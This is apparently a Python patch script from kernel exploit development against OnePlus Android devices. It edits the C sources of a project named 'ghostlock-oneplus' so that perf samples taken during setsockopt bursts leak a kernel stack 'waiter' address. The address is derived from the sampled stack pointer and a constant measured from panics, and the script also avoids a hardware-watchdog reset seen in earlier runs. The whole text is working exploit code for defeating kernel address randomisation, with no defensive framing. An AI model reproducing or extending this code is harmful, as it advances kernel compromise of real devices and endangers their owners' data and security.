#!/usr/bin/env python3
"""patch_waiter_leak_piggyback.py

Burst perf riêng (16×400 paint) làm trip watchdog phần cứng
(sec_debug_hw_reset) như dump 76 cho thấy.  Bỏ burst riêng: GỘP việc leak waiter
vào chính burst perf của page-leak (leak_page_via_perf) — burst đó đã chạy ổn
trong các lần trước, và sample ở đó cũng là kernel-mode của cùng thread T.

Thêm vào leak_page_via_perf: với mỗi sample abi==2, sp = regs[31],
  w = (sp & ~0x3fff) | 0x3d10     (waiter mod 0x4000 = 0x3d10, đo từ 5 panic)
  -> vote; kết quả lưu vào ssopt_leaked_waiter (global).
Route chỉ đọc global (bỏ block leak riêng).
"""
U = "/root/ghostlock/ghostlock-oneplus/src/core/util.c"
u = open(U).read()

# 1) thêm vote vào leak_page_via_perf
old = """      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32; i++) {"""
new = """      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        if (abi == 2) {
          /* waiter = (SP & ~0x3fff) | 0x3d10  (hằng số đo từ 5 panic;
           * xem BAN_GIAO §17.2).  Gộp vào burst này để KHÔNG thêm tải perf. */
          uint64_t w0 = (regs[31] & ~0x3fffULL) | (wl_lo_mask & 0x3fffULL);
          if ((w0 >> 32) == 0xffffff80ULL) {
            int k = -1;
            for (int t = 0; t < wl_nc; t++) if (wl_cand[t] == w0) { k = t; break; }
            if (k >= 0) wl_cnt[k]++;
            else if (wl_nc < 16) { wl_cand[wl_nc] = w0; wl_cnt[wl_nc] = 1; wl_nc++; }
            wl_insock++;
          }
          wl_lo_hist[(regs[31] & 0x3fffULL) & 0xff]++;
        }
        for (int i = 0; i < 32; i++) {"""
assert u.count(old) == 1, ("piggyback", u.count(old))
u = u.replace(old, new, 1)

# 2) leak_page_via_perf: sau vòng lặp vote, đặt ssopt_leaked_waiter = mode
old = """  munmap(buf, msz);
  close(pfd);"""
new = """  munmap(buf, msz);
  close(pfd);
  {   /* publish the waiter candidate leaked above (see BAN_GIAO §17) */
    uint64_t best = 0; int bestn = 0;
    for (int t = 0; t < wl_nc; t++)
      if (wl_cnt[t] > bestn) { bestn = wl_cnt[t]; best = wl_cand[t]; }
    if (best && bestn >= 2) ssopt_leaked_waiter = best;
    pr_info("waiter leak (piggyback): accepted=%d cands=%d best=%016zx x%d\\n",
            wl_insock, wl_nc, (uintptr_t)best, bestn);
    for (int r = 0; r < 3; r++) {
      uint64_t bv = 0; int bi = -1;
      for (int t = 0; t < 256; t++) if (wl_lo_hist[t] > bv) { bv = wl_lo_hist[t]; bi = t; }
      if (bi < 0 || bv == 0) break;
      pr_info("  sp&0x3fff hist[%d] = %d\\n", bi, (int)bv);
      wl_lo_hist[bi] = 0;
    }
    fsync(1);
  }"""
assert u.count(old) == 1, ("publish", u.count(old))
u = u.replace(old, new, 1)

# 3) globals đã có: wl_cand/wl_cnt/wl_nc/wl_insock/wl_lo_hist/wl_lo_mask — nhưng
#    chúng đang được khai báo SAU leak_page_via_perf? kiểm tra: nếu chưa khai báo
#    trước, chuyển khai báo lên trên (ngay sau ssopt_perf_fd).
need = "static uint64_t wl_cand[16];"
i_glob = u.find(need)
i_leak = u.find("static uintptr_t leak_page_via_perf(void)")
assert i_glob > 0 and i_leak > 0, (i_glob, i_leak)
if i_glob > i_leak:
    # cắt khối khai báo ra và chèn trước leak_page_via_perf
    j = u.find("static uint64_t wl_lo_mask = 0x3d10;")
    j2 = u.find("\n", j) + 1
    block = u[i_glob:j2]
    u = u[:i_glob] + u[j2:]
    i_leak = u.find("static uintptr_t leak_page_via_perf(void)")
    u = u[:i_leak] + block + "\n" + u[i_leak:]
    print("util.c: moved wl_* declarations above leak_page_via_perf")
open(U, "w").write(u)
print("util.c: waiter leak piggybacked into leak_page_via_perf")

# 4) fops.c: bỏ burst leak riêng, chỉ đọc global
F = "/root/ghostlock/ghostlock-oneplus/src/core/fops.c"
s = open(F).read()
old = """    ssopt_set_waiter_lo();
    if (ssopt_perf_begin() == 0) {
      static unsigned char dummy[0x100];
      memset(dummy, 0, sizeof dummy);
      /* perf SW cpu-clock rate is ~80k/s, so we need tens of milliseconds of
       * kernel time: ~5000 cheap optname-1000 paints, draining the ring
       * (userspace-only read) between rounds.  Every accepted sample sits inside
       * one function with a FIXED sp, so all accepted candidates are equal. */
      for (int round = 0; round < 16; round++) {
        for (int i = 0; i < 400; i++)
          setsockopt(sock_paint_fd, SOL_SOCKET, 1000, dummy, 0xfe);
        ssopt_perf_drain();
      }
      ssopt_leaked_waiter = ssopt_perf_result();
      ssopt_perf_close();
    }
    pr_info("ssopt waiter = %016zx (perf leak)\\n",
            (uintptr_t)ssopt_leaked_waiter);
    fsync(1);"""
new = """    ssopt_set_waiter_lo();
    /* The waiter is leaked by prepare_perf_fake_page()'s own perf burst
     * (leak_page_via_perf) -- doing a second burst here tripped the hardware
     * watchdog (sec_debug_hw_reset, dump 76), so we only read the global. */
    pr_info("ssopt waiter = %016zx (perf leak, piggybacked)\\n",
            (uintptr_t)ssopt_leaked_waiter);
    fsync(1);"""
assert s.count(old) == 1, ("fops block", s.count(old))
s = s.replace(old, new, 1)
open(F, "w").write(s)
print("fops.c: no separate perf burst; read ssopt_leaked_waiter")
